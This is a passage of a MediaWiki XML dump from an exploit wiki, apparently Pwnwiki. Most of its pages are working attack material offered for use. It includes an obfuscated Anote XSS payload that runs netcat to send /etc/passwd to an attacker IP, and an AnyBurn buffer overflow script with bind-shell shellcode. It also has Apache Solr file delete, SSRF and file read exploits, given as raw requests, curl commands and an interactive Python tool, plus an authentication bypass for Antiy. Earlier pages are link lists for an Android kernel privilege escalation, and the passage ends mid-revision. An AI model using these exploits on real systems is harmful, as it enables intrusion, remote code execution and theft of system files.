      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="598" sha1="pnrfhkorj19qbbls4ng4kybat3vok48" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

== Référence ==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>pnrfhkorj19qbbls4ng4kybat3vok48</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/he</title>
    <ns>0</ns>
    <id>3859</id>
    <revision>
      <id>4470</id>
      <timestamp>2021-06-09T10:20:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== הפניה =="</comment>
      <origin>4470</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="597" sha1="dec3pql8dfjvr6lzqcdxt75ybjytqfi" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

== הפניה ==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>dec3pql8dfjvr6lzqcdxt75ybjytqfi</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/id</title>
    <ns>0</ns>
    <id>2808</id>
    <revision>
      <id>3309</id>
      <timestamp>2021-05-26T13:14:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Kerentanan eskalasi hak istimewa kernel Android CVE-2019-2215 Binder UAF"</comment>
      <origin>3309</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="596" sha1="cw90u2vjp6ocpid3gj4olp2d6jkb210" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

== Referensi ==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>cw90u2vjp6ocpid3gj4olp2d6jkb210</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/ru</title>
    <ns>0</ns>
    <id>1427</id>
    <revision>
      <id>1799</id>
      <timestamp>2021-04-20T07:44:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Ссылки=="</comment>
      <origin>1799</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="597" sha1="r3rtp4y9vni16lcrahm369aw98yqojd" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

==Ссылки==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>r3rtp4y9vni16lcrahm369aw98yqojd</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/uk</title>
    <ns>0</ns>
    <id>305</id>
    <revision>
      <id>461</id>
      <timestamp>2021-03-19T11:13:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Довідка =="</comment>
      <origin>461</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="601" sha1="8gcmhoee8h1dyrg3shskdwewzarmjjb" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

== Довідка ==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>8gcmhoee8h1dyrg3shskdwewzarmjjb</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/zh-cn</title>
    <ns>0</ns>
    <id>3535</id>
    <revision>
      <id>4110</id>
      <timestamp>2021-06-06T08:55:15Z</timestamp>
      <contributor>
        <username>Xl199928</username>
        <id>290</id>
      </contributor>
      <comment>Created page with "Android内核提权漏洞CVE-2019-2215 Binder UAF"</comment>
      <origin>4110</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="591" sha1="4fjyj9d6pxnl9wn69og27r2i0sjray2" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

==参考==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>4fjyj9d6pxnl9wn69og27r2i0sjray2</sha1>
    </revision>
  </page>
  <page>
    <title>Anote 1.0 XSS&amp;RCE漏洞</title>
    <ns>0</ns>
    <id>2067</id>
    <revision>
      <id>2491</id>
      <timestamp>2021-05-05T12:24:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Anote 1.0 - XSS to RCE # Exploit Author: TaurusOmar # Date: 04/05/2021 # CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H # Risk: High (8.8) # Vendo..."</comment>
      <origin>2491</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3928" sha1="k8jhq5ki2kj033l6dz9k0wzvmdjwg4c" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Anote 1.0 - XSS to RCE
# Exploit Author: TaurusOmar
# Date: 04/05/2021
# CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
# Risk: High (8.8)
# Vendor Homepage: https://github.com/AnotherNote/anote
# Version: 1.0
# Tested on: Linux, MacOs

# Software Description:
A simple opensource note app support markdown only, anote allows you to view and edit files markdown has a friendly interface for paste image paste html (includes retrieve image locally) export sale file with images
export PDF support tray menu quick note (evernote inspired)
cmd + v default will convert html.



# Vulnerability Description:
The software allows you to store payloads within its own editor, as well as upload (.md) files once malicious code is entered, the payload will be executed immediately.
The attacker can send a malicious file with the payload, when this file is opened, the chain will be executed successfully giving access to
the remote attacker to get remote execution on the computer.


#Proof Video
https://imgur.com/a/mFMDOuu




# Payload : exec(Attacker Reverse netcat stolen =&gt; /etc/passwd) &amp;&amp; exec(calc)

{"bookId":"ddpQIk8Fhmoyr2wK","available":true,"_id":"VDJCb2CaIHObFXlw","createdAt":{"$$date":1620076429201},"updatedAt":{"$$date":1620076529398},"title":"XSS TO RCE","content":"[&lt;audio src=x onerror=writeln(String.fromCharCode(10,60,97,117,100,105,111,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,34,99,111,110,115,116,32,101,120,101,99,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,59,10,101,120,101,99,40,39,110,99,32,45,119,32,51,32,49,57,50,46,49,54,56,46,49,49,49,46,49,50,57,32,49,51,51,55,32,60,32,47,101,116,99,47,112,97,115,115,119,100,39,44,32,40,101,44,32,115,116,100,111,117,116,44,32,115,116,100,101,114,114,41,61,62,32,123,32,105,102,32,40,101,32,105,110,115,116,97,110,99,101,111,102,32,69,114,114,111,114,41,32,123,10,99,111,110,115,111,108,101,46,101,114,114,111,114,40,101,41,59,32,116,104,114,111,119,32,101,59,32,125,32,99,111,110,115,111,108,101,46,108,111,103,40,39,115,116,100,111,117,116,32,39,44,32,115,116,100,111,117,116,41,59,10,99,111,110,115,111,108,101,46,108,111,103,40,39,115,116,100,101,114,114,32,39,44,32,115,116,100,101,114,114,41,59,125,41,59,10,97,108,101,114,116,40,39,49,39,41,34,62,60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))&gt;](http://)"}
{"$$indexCreated":{"fieldName":"updatedAt","unique":false,"sparse":false}}
{"$$indexCreated":{"fieldName":"bookId","unique":false,"sparse":false}}
            
&lt;/pre&gt;</text>
      <sha1>k8jhq5ki2kj033l6dz9k0wzvmdjwg4c</sha1>
    </revision>
  </page>
  <page>
    <title>Antiy（安天）高級可持續威脅安全檢測系統越權訪問漏洞</title>
    <ns>0</ns>
    <id>1372</id>
    <revision>
      <id>1730</id>
      <timestamp>2021-04-18T12:00:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用== 在登錄頁面抓包，其中抓包过程中发现请求的一个身份验证 Url  &lt;pre&gt; {"role": "", "login_status": false, "result": "ok"} &lt;/pre&gt;  其中 l..."</comment>
      <origin>1730</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="295" sha1="jexsgcqzz8bhy7ot411gna44tnawrj4" xml:space="preserve">==漏洞利用==
在登錄頁面抓包，其中抓包过程中发现请求的一个身份验证 Url

&lt;pre&gt;
{"role": "", "login_status": false, "result": "ok"}
&lt;/pre&gt;

其中 login_status 為 false, 將參數使用 Burp 替換響應包為 true
請求 /api/user/islogin 時成功越過身份驗證</text>
      <sha1>jexsgcqzz8bhy7ot411gna44tnawrj4</sha1>
    </revision>
  </page>
  <page>
    <title>AnyBurn 4.3 本地緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>483</id>
    <revision>
      <id>685</id>
      <timestamp>2021-03-27T02:51:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python  # Exploit Title: AnyBurn 4.3 - Local Buffer Overflow (SEH Unicode) # Date: 20-12-2018 # Exploit Author: Matteo Malvica # Vendor Homepage:..."</comment>
      <origin>685</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2938" sha1="occkv7s7vxz9yh4xaj4fx9zgtibfrkj" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python

# Exploit Title: AnyBurn 4.3 - Local Buffer Overflow (SEH Unicode)
# Date: 20-12-2018
# Exploit Author: Matteo Malvica
# Vendor Homepage: http://www.anyburn.com/
# Software Link : http://www.anyburn.com/anyburn_setup.exe
# Tested Version: 4.3 (32-bit) 
# Tested on: Windows 7 x64 SP1
# Credits: original vulnerability discovered by Achilles: https://www.exploit-db.com/exploits/46002

# Steps to reproduce:
# 1.- Run the python code
# 2.- Open exploit.txt and copy its content to the clipboard
# 3.- Open AnyBurn and choose 'Copy disk to Image'
# 4.- Paste the content of exploit.txt into the field: 'Image file name'
# 5.- Click 'Create Now' 
# 6.- Check with command prompt 'netstat -ano' and you should see a port listening on 9988
# 7.- With windows firewall disabled, from another host: 'nc [remote_IP] 9988'


# alphanumeric bindshell - port 9988, courtesy of b33f
shellcode = (
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1"
"AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA"
"BAB30APB944JBKLK8CYKPM0KPQP59ZEP18RQTTKQBNP4KQBLLTK0RLTDKC"
"BMXLOWGOZO6NQKONQ7PVLOLC13LKRNLO0GQHOLMKQY7YRL022R74KPRLP4"
"KPBOLKQJ0TKOPSHSU7PD4OZKQ8PPPTKQ8LX4KQHO0M1ICJCOLOYTK04TKM"
"1YFP1KONQ7P6L7QXOLMKQ7W08K0RUZTM33ML8OKCMO4SEYRQHTKPXO4KQI"
"CQV4KLLPK4KR8MLKQHSTKKT4KKQJ0SYOTO4NDQKQK1Q0Y1JPQKOIPB8QOQ"
"JTKMBJKTFQM38NSOBKPKPQXBWBSNRQOB4QXPLBWNFLGKO8UWHDPM1KPKPN"
"IWTPTPPBHO9SPRKKPKOJ50P20PP0P10PP10R0S89ZLOIOYPKO9EE9XGNQ9"
"K1CRHM2KPNGKTTIK61ZLP0V0WBH7RYKOGS7KOXU0SPWQX7GIYOHKOKOZ50"
"SB3R7C83DZLOKK1KO8UQGTIGWS8RURN0M1QKO8URHRC2MQTKPTIK31G0WP"
"WNQL6QZMBR9R6JBKM1VY7OTMTOLM1KQTMOTO4N096KPQ4B4PPQF0VPVOV2"
"6PNB6R6B3QF1X3IHLOO3VKOHUTIK00NR6PFKONP38LHU7MMQPKOXUGKJPG"
"EVBPV38G6F5GM5MKOXUOLLF3LKZCPKKIPBUM57KOWMCSBRO2JM0PSKO9EA")


# total payload length 10000

align = (
"\x55"                      #push EBP - closer register to our shellcode, from where we are pivoting
"\x6e"                      #Venetian Padding
"\x58"                      #pop EAX
"\x6e"                      #Venetian Padding
"\x05\x22\x11"              #add eax,0x11002200  \
"\x6e"                      #Venetian Padding     |&gt; +0xB00 
"\x2d\x17\x11"              #sub eax,0x11001700  /
"\x6e"                      #Venetian Padding
"\x50"                      #push EAX
"\x6e"                      #Venetian Padding
"\xC3")                     #RETN

nseh = "\x94\x94" 			# ANSI x94 translates to Unicode 201D
seh =  "\xb5\x4d" 			# 0x004d00b5 POP POP RET in AnyBurn.exe module

preamble = "\x58" * 47 + shellcode + "\x58" * (9197-47- len(shellcode)) + nseh + seh
unicode_nops = "\x58" * 200
exploit = preamble + align + unicode_nops + "\x58" * (10000 - len(preamble) - len(unicode_nops)-len(align))

try:
	f=open("exploit.txt","w")
	print "[+] Creating %s bytes lasagna payload.." %len(exploit)
	f.write(exploit)
	f.close()
	print "[+] File created!"
except:
	print "File cannot be created"
            

&lt;/pre&gt;</text>
      <sha1>occkv7s7vxz9yh4xaj4fx9zgtibfrkj</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr 8.8.2 任意文件刪除漏洞</title>
    <ns>0</ns>
    <id>2550</id>
    <revision>
      <id>3048</id>
      <timestamp>2021-05-22T02:45:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Apache Solr &lt; = 8.8.2 &lt;/pre&gt;  ==POC== &lt;pre&gt; POST /solr/db/config HTTP/1.1 Host: 192.168.33.130:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64..."</comment>
      <origin>3048</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="924" sha1="o261ig0rin46ik7mcm3sex5d56qo0x0" xml:space="preserve">==影響版本==
&lt;pre&gt;
Apache Solr &lt; = 8.8.2
&lt;/pre&gt;

==POC==
&lt;pre&gt;
POST /solr/db/config HTTP/1.1
Host: 192.168.33.130:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-type:application/json
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 218
{
  "add-requesthandler": {
    "name": "/testping",
    "class":"solr.PingRequestHandler",
    "defaults":{"echoParams":"explicit"},
    "healthcheckFile":"../../../../../../../../../../../../../aaa.txt",
  }
}
&lt;/pre&gt;

檢查是否成功：
&lt;pre&gt;
http://target/solr/db/config/overlay?omitHeader=true
&lt;/pre&gt;

訪問
&lt;pre&gt;
http://target/solr/db/testping?action=DISABLE
&lt;/pre&gt;

文件已成功刪除</text>
      <sha1>o261ig0rin46ik7mcm3sex5d56qo0x0</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr SSRF漏洞</title>
    <ns>0</ns>
    <id>1357</id>
    <revision>
      <id>1699</id>
      <timestamp>2021-04-16T03:20:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響範圍== Apache Solr &lt; 8.8.2  ==FOFA== &lt;pre&gt; app="APACHE-Solr" &lt;/pre&gt;  ==EXP== &lt;pre&gt; http://127.0.0.1:8983/solr/db/replication\?command=fetchindex\&amp;masterUrl=http://xx..."</comment>
      <origin>1699</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="184" sha1="fpobhxc9xlspk7dfug4g3wm3iw1xeoz" xml:space="preserve">==影響範圍==
Apache Solr &lt; 8.8.2

==FOFA==
&lt;pre&gt;
app="APACHE-Solr"
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
http://127.0.0.1:8983/solr/db/replication\?command=fetchindex\&amp;masterUrl=http://xxxx
&lt;/pre&gt;</text>
      <sha1>fpobhxc9xlspk7dfug4g3wm3iw1xeoz</sha1>
    </revision>
  </page>
  <page>
    <title>Apache Solr任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>244</id>
    <revision>
      <id>384</id>
      <timestamp>2021-03-18T02:38:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Apache Solr &lt;= 8.8.1 &lt;/pre&gt;  &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 首先進入管理員頁..."</comment>
      <origin>384</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5529" sha1="j91sf4kks0vyfouso8xeh9qzz9xi19m" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
首先進入管理員頁面，獲取core的信息：
&lt;/translate&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


&lt;translate&gt;
發送以下數據包
&lt;/translate&gt;
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

&lt;translate&gt;
==文件讀取==
&lt;/translate&gt;
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
&lt;/pre&gt;


&lt;translate&gt;
curl請求爲：
&lt;/translate&gt;
&lt;pre&gt;
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd" 
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&amp;wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile &gt;&gt;&gt; \033[0m"))
        POC_3(target_url, core_name, File_name)
&lt;/pre&gt;</text>
      <sha1>j91sf4kks0vyfouso8xeh9qzz9xi19m</sha1>
    </revision>
    <revision>
      <id>385</id>
      <parentid>384</parentid>
      <timestamp>2021-03-18T02:38:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>385</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5595" sha1="pf3bm71f2nmb2trwp5m8t03zjeeipv4" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Apache Solr &lt;= 8.8.1
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
首先進入管理員頁面，獲取core的信息：
&lt;/translate&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:4--&gt;
發送以下數據包
&lt;/translate&gt;
&lt;pre&gt;
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
&lt;/pre&gt;

&lt;translate&gt;
==文件讀取== &lt;!--T:5--&gt;
&lt;/translate&gt;
&lt;pre&gt;
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
